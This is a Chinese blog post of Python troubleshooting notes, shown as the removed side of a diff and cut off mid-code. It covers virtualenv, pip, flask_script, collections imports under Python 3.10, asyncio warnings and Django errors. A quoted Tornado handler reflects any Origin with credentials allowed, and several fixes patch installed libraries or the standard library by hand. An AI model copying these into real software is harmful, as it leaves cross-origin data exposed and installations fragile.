-            <a href="/2022/08/17/%E7%96%91%E9%9A%BE%E8%A7%A3%E7%AD%94-python/" class="post-title-link" itemprop="url">疑难解答-python</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-08-17 10:16:24" itemprop="dateCreated datePublished" datetime="2022-08-17T10:16:24+08:00">2022-08-17</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-10-19 12:46:21" itemprop="dateModified" datetime="2022-10-19T12:46:21+08:00">2022-10-19</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/troubleshooting/" itemprop="url" rel="index"><span itemprop="name">troubleshooting</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="python虚拟环境的常见命令"><a href="#python虚拟环境的常见命令" class="headerlink" title="python虚拟环境的常见命令"></a>python虚拟环境的常见命令</h1><p>原文：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/d8833799d934">https://www.jianshu.com/p/d8833799d934</a> </p>
-<p>当做一个项目时，可能会用到一些模块，如果都用电脑自带的python环境，并且把所有的模块都安装在这上面，很容易使得自带python环境十分臃肿，而且到时候如果迁移到别的电脑时还需要重新安装对应模块，所以可以用虚拟环境，在不同的环境下安装对应的模块，迁移时也把整个环境迁移过去即可使用虚拟环境步骤</p>
-<p>1.创建虚拟环境<br>输入命令：<code>virtualenv 环境名</code><br>（如果有多个python版本，可以通过命令：<code>virtualenv -p python路径 环境名</code>，来创建虚拟环境）<br>2.进入环境下的<code>Scripts</code>文件夹下<br>输入命令执行脚本：<code>activate</code><br>3.接下来就可以在该虚拟环境下pip安装包或者做各种事了，</p>
-<p>比如要安装django2.0版本就可以：<code>pip install django==2.0</code></p>
-<p><strong>退出虚拟环境</strong></p>
-<p>输入命令：<code>deactivate</code></p>
-<p><strong>管理虚拟环境</strong></p>
-<p>虚拟环境还可以通过一些工具来管理，从而使用起来更加方便，这里推荐<code>virtualenvwrapper</code><br>输入命令：<code>pip install virtualenvwrapper-win</code>（window版），下载<code>virtualenvwrapper</code></p>
-<p><strong>创建虚拟环境</strong></p>
-<p>输入命令：<code>mkvirtualenv 环境名</code><br>与直接用virtualenv创建不同的是，前面那个是在当前文件夹下创建虚拟环境，而这个是统一在当前用户的<code>envs</code>文件夹下创建，并且会自动进入到该虚拟环境下<br>如果不想在默认地方创建（<code>c:userenvs</code>），可以新建个环境变量：<code>WORKON_HOME</code>，然后里面设置默认路径<br>如果要指定python版本，则输入：<code>mkvirtualenv --python=python路径（到exe文件） 环境名</code></p>
-<p><strong>进入虚拟环境输入命令</strong>：<code>workon 环境名</code></p>
-<p><strong>退出虚拟环境输入命令</strong>：<code>deactivate</code></p>
-<p><strong>删除虚拟环境输入命令</strong>：<code>rmvirtualenv 环境名</code></p>
-<p><strong>列出虚拟环境输入命令</strong>：<code>lsvirtualenv</code></p>
-<p><strong>进入到虚拟环境目录输入命令</strong>：<code>cdvirtualenv 环境名</code></p>
-<p>更多参考<a target="_blank" rel="noopener" href="https://www.cnblogs.com/codechangemyworld/p/5277032.html">https://www.cnblogs.com/codechangemyworld/p/5277032.html</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/chenxinming-top/p/7843178.html">https://www.cnblogs.com/chenxinming-top/p/7843178.html</a></p>
-<h1 id="notes"><a href="#notes" class="headerlink" title="notes"></a>notes</h1><p>修改pip安装源：<br>在”c:\users***\pip&quot;下创建”pip.ini”文件<br>文件内写上：<br>[global]<br>index-url=<a target="_blank" rel="noopener" href="https://pypi.doubanio.com/simple">https://pypi.doubanio.com/simple</a></p>
-<p>查看依赖库版本：pip freeze / pip list<br>安装指定版本依赖库：pip install ***==x.x.x<br>生成所需依赖库txt文件：pip freeze &gt; requirements.txt<br>根据已有依赖库txt文件安装库：pip install -r requirements.txt</p>
-<h1 id="Python-flask-flask-script-报错：ModuleNotFoundError-No-module-named-‘flask-compat’解决方法"><a href="#Python-flask-flask-script-报错：ModuleNotFoundError-No-module-named-‘flask-compat’解决方法" class="headerlink" title="Python flask flask_script 报错：ModuleNotFoundError: No module named ‘flask._compat’解决方法"></a>Python flask flask_script 报错：ModuleNotFoundError: No module named ‘flask._compat’解决方法</h1><ul>
-<li><a href="javascript:void(0);">levi</a> 编辑于 2021-06-27</li>
-</ul>
-<p>本文主要介绍Python中，使用flask中flask_script时，报错：ModuleNotFoundError: No module named ‘flask._compat’的解决方法，以及相关示例代码。</p>
-<p><strong>manage.py：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from flask_script import Manager</span><br><span class="line">from main import app</span><br><span class="line">manager = Manager(app)</span><br><span class="line">@manager.command</span><br><span class="line">def hello():</span><br><span class="line">    print (&quot;hello&quot;)</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    manager.run()</span><br></pre></td></tr></table></figure>
-
-<p><strong>main.py:</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br></pre></td></tr></table></figure>
-
-<p><strong>报错信息：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(venv) cjavapy@cjavapy-PC:~/Proyectos Python/flask_script$ python3 manage.py hello</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;manage.py&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    from flask_script import Manager</span><br><span class="line">  File &quot;/home/cjavapy/Proyectos Python/flask_script/venv/lib/python3.8/site-packages/flask_script/__init__.py&quot;, line 15, in &lt;module&gt;</span><br><span class="line">    from flask._compat import text_type</span><br><span class="line">ModuleNotFoundError: No module named &#x27;flask._compat&#x27;</span><br></pre></td></tr></table></figure>
-
-<p><strong>原因：</strong></p>
-<p>可能是更新了Flask版本问题，导致<code>Flask._compat</code>的目录发生变化。</p>
-<p><strong>解决方法：</strong></p>
-<p>使用如下命令降级；</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install &quot;Flask==1.1.4&quot;</span><br><span class="line">pip install &quot;werkzeug==1.0.1&quot;</span><br></pre></td></tr></table></figure>
-
-<p>或者</p>
-<p>不使用<code>Flask-Script</code>，使用<code>flask</code>命令如下：</p>
-<p>初始化数据库：<code>flask db init</code></p>
-<p>迁移新更改：<code>flask db migrate</code></p>
-<p>升级：<code>flask db upgrade</code></p>
-<p>还有其它命令…</p>
-<p>或者</p>
-<p><strong>不降级则可以尝试修改一下<code>flask_script/__init__.py</code>中<code>from ._compat import text_type</code> 改成 <code>from flask_script._compat import text_type</code> 。</strong></p>
-<h1 id="【已解决】Python-3-10-使用pdf2docx报错ImportError-cannot-import-name-‘Iterable‘-from-‘collections‘的解决办法"><a href="#【已解决】Python-3-10-使用pdf2docx报错ImportError-cannot-import-name-‘Iterable‘-from-‘collections‘的解决办法" class="headerlink" title="【已解决】Python 3.10 使用pdf2docx报错ImportError:cannot import name ‘Iterable‘ from ‘collections‘的解决办法"></a>【已解决】Python 3.10 使用pdf2docx报错ImportError:cannot import name ‘Iterable‘ from ‘collections‘的解决办法</h1><p>本人初学Python，经推荐看到一个很简单快捷的pdf转docx方法，仅仅需要几行代码即可完成，于是想抄来用，但是因为我安装的Python是3.10.0版，运行的时候老是报错：ImportError:cannot import name ‘Iterable’ from ‘collections’，在“老表Max”的指导下，解决了此问题，感谢！</p>
-<p>pdf2docx代码介绍：</p>
-<p>Convert PDF — pdf2docx 0.5.2 documentation</p>
-<p>运行报错状态：</p>
-<p><img src="https://img-blog.csdnimg.cn/24e14282389344a5ba64e93b786faf7d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARGFuaWVsX1hpZV84NA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
-<p>原因查找：</p>
-<p>经网上搜索，感谢几位网友的经验，应该是版本导致的问题</p>
-<p><img src="https://img-blog.csdnimg.cn/453a8745f36b44a4aaec6faae1033d3b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARGFuaWVsX1hpZV84NA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
-<p>解决方法：</p>
-<p>我尝试直接在代码前面加上‘from collections.abc import Iterable’, 测试结果是True,但是还是不能运行。经‘老表Max’指点，看最后一次报错的文件，去改那个文件的代码，然后保存即可 </p>
-<p><img src="https://img-blog.csdnimg.cn/09054a3da7b14c35af8756b04954cb5e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARGFuaWVsX1hpZV84NA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
-<p><img src="https://img-blog.csdnimg.cn/a0726661a71b48fca3ff574f394655ed.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARGFuaWVsX1hpZV84NA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
-<p>运行成功界面：</p>
-<p><img src="https://img-blog.csdnimg.cn/db8a76d9d91340ca9607cfcfc6e24763.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARGFuaWVsX1hpZV84NA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
-<h1 id="cannot-import-name-‘Mapping‘-from-‘collections‘"><a href="#cannot-import-name-‘Mapping‘-from-‘collections‘" class="headerlink" title="cannot import name ‘Mapping‘ from ‘collections‘"></a>cannot import name ‘Mapping‘ from ‘collections‘</h1><p>解决步骤：</p>
-<p>①复制该地址<code>“C:\User\…\AppData\Local\Programs\Python\Python310\lib\collections_init_.py”</code><br>②打开这个地址<br>③加上这条语句：<code>from collections.abc import Mapping</code></p>
-<p><img src="https://img-blog.csdnimg.cn/db0e6deff567453cb7f4dab12fb7511a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQXNkenhjeXVpaGprcXdl,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"></p>
-<p>保存，再输一遍，搞掂</p>
-<p><img src="https://img-blog.csdnimg.cn/11cae4aca04f4468b62c872f60c2a756.png#pic_center" alt="在这里插入图片描述"></p>
-<p>————————————————<br>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_51092297/article/details/122889327">https://blog.csdn.net/weixin_51092297/article/details/122889327</a></p>
-<h1 id="AttributeError-module-‘collections‘-has-no-attribute-‘MutableMapping‘"><a href="#AttributeError-module-‘collections‘-has-no-attribute-‘MutableMapping‘" class="headerlink" title="AttributeError: module ‘collections‘ has no attribute ‘MutableMapping‘"></a>AttributeError: module ‘collections‘ has no attribute ‘MutableMapping‘</h1><p>情况说明<br>今天在装live server时遇到如下两个问题。</p>
-<p>module ‘collections’ has no attribute ‘MutableSet’<br>AttributeError: module ‘collections’ has no attribute ‘MutableMapping’<br>部分错误结果如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">(py3_django4-<span class="number">0</span>-<span class="number">4</span>) lds@lishuaige:~/Desktop/meiduo/front_end$ live-server </span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;/home/lds/.local/bin/live-server&quot;</span>, line <span class="number">5</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="keyword">from</span> live_server.cli <span class="keyword">import</span> cli</span><br><span class="line">  File <span class="string">&quot;/home/lds/.local/lib/python3.10/site-packages/live_server/cli.py&quot;</span>, line <span class="number">4</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="keyword">from</span> . <span class="keyword">import</span> watcher</span><br><span class="line">  File <span class="string">&quot;/home/lds/.local/lib/python3.10/site-packages/live_server/watcher.py&quot;</span>, line <span class="number">7</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="keyword">from</span> . <span class="keyword">import</span> server</span><br><span class="line">  File <span class="string">&quot;/home/lds/.local/lib/python3.10/site-packages/live_server/server.py&quot;</span>, line <span class="number">5</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="keyword">import</span> tornado.web</span><br><span class="line">  File <span class="string">&quot;/home/lds/.local/lib/python3.10/site-packages/tornado/web.py&quot;</span>, line <span class="number">88</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="keyword">from</span> tornado <span class="keyword">import</span> httputil</span><br><span class="line">  File <span class="string">&quot;/home/lds/.local/lib/python3.10/site-packages/tornado/httputil.py&quot;</span>, line <span class="number">107</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">HTTPHeaders</span>(collections.MutableMapping):</span><br><span class="line">AttributeError: module <span class="string">&#x27;collections&#x27;</span> has no attribute <span class="string">&#x27;MutableMapping&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>解决方案<br>网上找了好多都是把问题贴出来然后就没下文了，琢磨了三四个小时幸亏解决了！！应该是python 3.10 那些 MutableMapping，MutableSet等放的位置变了，他们的上级模块原本直属collections的变成了abc，也就是说，需要把</p>
-<p><code>collections.MutableMapping</code><br>改成</p>
-<p><code>collections.abc.MutableMapping</code><br>那要怎么改呢？比如我这里报错，就点进源文件里面</p>
-<p><img src="https://img-blog.csdnimg.cn/06d7782d73f3445f89512dd4718ac967.png" alt="在这里插入图片描述"></p>
-<p>按上述方法修改即可。</p>
-<p><img src="https://img-blog.csdnimg.cn/fc4a64259d1944deb86a3b10fe39336a.png" alt="在这里插入图片描述"></p>
-<h1 id="Content-Type标头未在Tornado中设置"><a href="#Content-Type标头未在Tornado中设置" class="headerlink" title="Content-Type标头未在Tornado中设置"></a>Content-Type标头未在Tornado中设置</h1><p>我有以下基类：</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">CorsHandler</span>(tornado.web.RequestHandler):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">set_default_headers</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(CorsHandler, self).set_default_headers()</span><br><span class="line"></span><br><span class="line">        self.set_header(<span class="string">&#x27;Access-Control-Allow-Origin&#x27;</span>, self.request.headers.get(<span class="string">&#x27;Origin&#x27;</span>, <span class="string">&#x27;*&#x27;</span>))</span><br><span class="line">        self.set_header(<span class="string">&#x27;Access-Control-Allow-Methods&#x27;</span>, <span class="string">&#x27;GET, PUT, POST, DELETE, OPTIONS&#x27;</span>)</span><br><span class="line">        self.set_header(<span class="string">&#x27;Access-Control-Allow-Credentials&#x27;</span>, <span class="string">&#x27;true&#x27;</span>)</span><br><span class="line">        self.set_header(<span class="string">&#x27;Access-Control-Allow-Headers&#x27;</span>, <span class="string">&#x27;,&#x27;</span>.join(</span><br><span class="line">            self.request.headers.get(<span class="string">&#x27;Access-Control-Request-Headers&#x27;</span>, <span class="string">&#x27;&#x27;</span>).split(<span class="string">&#x27;,&#x27;</span>) +</span><br><span class="line">            [<span class="string">&#x27;Content-Type&#x27;</span>]</span><br><span class="line">        ))</span><br><span class="line"></span><br><span class="line">        self.set_header(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;application/json&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">options</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
-
-<p>和以下处理程序：</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self, resource_id=<span class="literal">None</span>, field=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> resource_id <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            response = self.resource.query.filter_by(is_deleted=<span class="literal">False</span>).<span class="built_in">all</span>()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record = self.resource.query.get(<span class="built_in">int</span>(resource_id))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> field <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                response = record</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                response = &#123;field: <span class="built_in">getattr</span>(record, field)&#125;</span><br><span class="line"></span><br><span class="line">        self.db.session.commit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        self.db.session.rollback()</span><br><span class="line"></span><br><span class="line">        self.send_error(<span class="number">500</span>, message=e.message)</span><br><span class="line"></span><br><span class="line">    self.write(response)</span><br></pre></td></tr></table></figure>
-
-<p>除了未设置Content-Type之外，其他所有内容都非常简单明了。请注意，其他任何标题均已正确设置。</p>
-<p><strong>解决方案</strong></p>
-<p>看来这是<code>304 Not Modified</code>回应。请记住，只有第一个<code>200 OK</code>响应包含<code>Content-Type</code>标头。如果您请求相同的资源，则以下响应将忽略此标头。</p>
-<p>并且要注意，您实际上并不需要显式设置<code>Content-Type</code>。如果您查看Tornado的源代码，您将在以下注释中找到它<code>write(self, chunk)</code>：</p>
-<blockquote>
-<p>如果给定的块是字典，则将其编写为JSON并将响应的Content-Type设置为<code>application/json</code>。（如果您想以不同的方式发送JSON <code>Content-Type</code>，请<em>在</em>调用write（）<em>之后</em>调用set_header ）。</p>
-</blockquote>
-<h1 id="python报-DeprecationWarning-“-coroutine”-decorator-…-use-“async-def”-解决办法"><a href="#python报-DeprecationWarning-“-coroutine”-decorator-…-use-“async-def”-解决办法" class="headerlink" title="python报 DeprecationWarning: “@coroutine” decorator …. use “async def” 解决办法"></a>python报 DeprecationWarning: “@coroutine” decorator …. use “async def” 解决办法</h1><p>python报错：<br>DeprecationWarning: “@coroutine” decorator is deprecated since Python 3.8, use “async def” instea def logger_factory(app, handler):</p>
-<p><img src="https://img-blog.csdnimg.cn/20191224115944580.png" alt="在这里插入图片描述"></p>
-<p>报错原因：<br>用asyncio提供的@asyncio.coroutine可以把一个generator标记为coroutine类型，然后在coroutine内部用yield from调用另一个coroutine实现异步操作。<br>但是从Python 3.5开始引入了新的语法async和await，可以让coroutine的代码更简洁易读（抛弃了@asyncio.coroutine）。</p>
-<p>解决办法：<br>async和await是针对coroutine的新语法，要使用新的语法，只需要做两步简单的替换：</p>
-<p>1.把@asyncio.coroutine替换为async；<br>2.把yield from替换为await。<br>小结<br>Python从3.5版本开始为asyncio提供了async和await的新语法；<br>注意新语法只能用在Python 3.5以及后续版本，如果使用3.4版本，则仍需使用@asyncio.coroutine。</p>
-<h1 id="DeprecationWarning-There-is-no-current-event-loop"><a href="#DeprecationWarning-There-is-no-current-event-loop" class="headerlink" title="DeprecationWarning: There is no current event loop"></a>DeprecationWarning: There is no current event loop</h1><p>我目前所发现的报错原因有以下两种：</p>
-<ol>
-<li><code>loop=asyncio.get_event_loop()</code><br>改为</li>
-</ol>
-<p>​    <code>loop = asyncio.new_event_loop() ​    asyncio.set_event_loop(loop)</code></p>
-<ol start="2">
-<li>由于使用 asyncio.ensure_future() ,需要传入参数以外还需要传入指定loop，如下所示：</li>
-</ol>
-<p><code>task = asyncio.ensure_future(c, loop=loop)</code><br>由于python代码的缩进问题十分严谨，所以new_event_loop以及set_event_loop必须放在ensure_future上面</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 正确用法</span></span><br><span class="line"></span><br><span class="line">loop = asyncio.new_event_loop()</span><br><span class="line">asyncio.set_event_loop(loop)</span><br><span class="line">...</span><br><span class="line">task = asyncio.ensure_future(c, loop=loop)</span><br><span class="line"></span><br><span class="line"><span class="comment"># c是你自己创建的协程对象，我这里忽略了</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 错误用法</span></span><br><span class="line"></span><br><span class="line">task = asyncio.ensure_future(c, loop=loop)</span><br><span class="line">...</span><br><span class="line">loop = asyncio.new_event_loop()</span><br><span class="line">asyncio.set_event_loop(loop)</span><br></pre></td></tr></table></figure>
-
-<h1 id="使用Django管理员在后台添加数据库时出现no-such-table-main-auth-user-old解决方法"><a href="#使用Django管理员在后台添加数据库时出现no-such-table-main-auth-user-old解决方法" class="headerlink" title="使用Django管理员在后台添加数据库时出现no such table: main.auth_user__old解决方法"></a>使用Django管理员在后台添加数据库时出现no such table: main.auth_user__old解决方法</h1><p><img src="https://img-blog.csdnimg.cn/20c93d2929ec4a1b8e52a3d6baa4a38d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATmFyY2lzc3VzYOWwj-aarg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
-<p>在学习Django开发时，创建好管理员账号后，准备通过Django内置的管理网页来测试能否在表中添加记录，选择save后出现如上图所示的报错。</p>
-<p>解决方案是升级Django的版本，原Django version==2.0<br>在命令行中输入</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install Django --upgrade</span><br></pre></td></tr></table></figure>
-
-<p>删除掉app下的migrations文件夹，删除掉db.sqlite3</p>
-<p>然后开始对默认的app进行迁移</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python manage.py migrate</span><br></pre></td></tr></table></figure>
-
-<p>执行完这条命令就可以看到db.sqlite新建好了</p>
-<p>然后迁移自己的app</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python manage.py makemigrations common</span><br><span class="line">python manage.py migrate common</span><br></pre></td></tr></table></figure>
-
-<p>完成数据库迁移之后，再次创建超级用户</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python manage.py createsuperuser</span><br></pre></td></tr></table></figure>
-
-<p>可以在新的auth_user表中查看到自己新建的超级用户</p>
-<p><img src="https://img-blog.csdnimg.cn/2e83a4ea95e44d30ba8f7dad5f2ce343.png" alt="在这里插入图片描述"></p>
-<p>保证服务器的运行，进入<a target="_blank" rel="noopener" href="http://127.0.0.1/admin/">http://127.0.0.1/admin/</a><br>再次新建用户，此时就可以正常的创建了，问题解决！</p>
-<p><img src="https://img-blog.csdnimg.cn/31924b5683e64ef3bc5efcb4fce45e6c.png" alt="在这里插入图片描述"></p>
-<h1 id="TemplateDoesNotExist-at"><a href="#TemplateDoesNotExist-at" class="headerlink" title="TemplateDoesNotExist at/****"></a>TemplateDoesNotExist at/****</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">TemplateDoesNotExist at /user/find</span><br><span class="line">fruit/list.html</span><br><span class="line">Request Method:	GET</span><br><span class="line">Request URL:	http://localhost:8000/user/find?price1=5</span><br><span class="line">Django Version:	4.0.6</span><br><span class="line">Exception Type:	TemplateDoesNotExist</span><br><span class="line">Exception Value:	</span><br><span class="line">fruit/list.html</span><br><span class="line">Exception Location:	I:\CDriveSW\desktop\python\python-web2\hiDjango\venv\lib\site-packages\django\template\loader.py, line 19, in get_template</span><br><span class="line">Python Executable:	I:\CDriveSW\desktop\python\python-web2\hiDjango\venv\Scripts\python.exe</span><br><span class="line">Python Version:	3.10.4</span><br><span class="line">Python Path:	</span><br><span class="line">[&#x27;I:\\CDriveSW\\desktop\\python\\python-web2\\hiDjango\\helloDjango&#x27;,</span><br><span class="line"> &#x27;C:\\Users\\Private\\AppData\\Local\\Programs\\Python\\Python310\\python310.zip&#x27;,</span><br><span class="line"> &#x27;C:\\Users\\Private\\AppData\\Local\\Programs\\Python\\Python310\\DLLs&#x27;,</span><br><span class="line"> &#x27;C:\\Users\\Private\\AppData\\Local\\Programs\\Python\\Python310\\lib&#x27;,</span><br><span class="line"> &#x27;C:\\Users\\Private\\AppData\\Local\\Programs\\Python\\Python310&#x27;,</span><br><span class="line"> &#x27;I:\\CDriveSW\\desktop\\python\\python-web2\\hiDjango\\venv&#x27;,</span><br><span class="line"> &#x27;I:\\CDriveSW\\desktop\\python\\python-web2\\hiDjango\\venv\\lib\\site-packages&#x27;]</span><br><span class="line">Server time:	Sat, 16 Jul 2022 14:11:19 +0800</span><br></pre></td></tr></table></figure>
-
-<p>出错原因：访问不到templates里面的模板<br><strong>解决方式</strong></p>
-<ul>
-<li><p>方法1、 复制hello.html文件至安装路径下的Python27\lib\site-packages\django-1.8.18-py2.7.egg文件下<br>启动服务python manage.py runserver 127.0.0.1:8000<br>运行<a target="_blank" rel="noopener" href="http://127.0.0.1:8000/hello%EF%BC%8C%E9%94%99%E8%AF%AF%E8%A7%A3%E5%86%B3%E3%80%82">http://127.0.0.1:8000/hello，错误解决。</a></p>
-</li>
-<li><p>方法2、文件夹templates复制到project项目文件夹下。</p>
-</li>
-<li><p>方法3、在settings.py里确认TEMPLATES目录</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">  BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))  <span 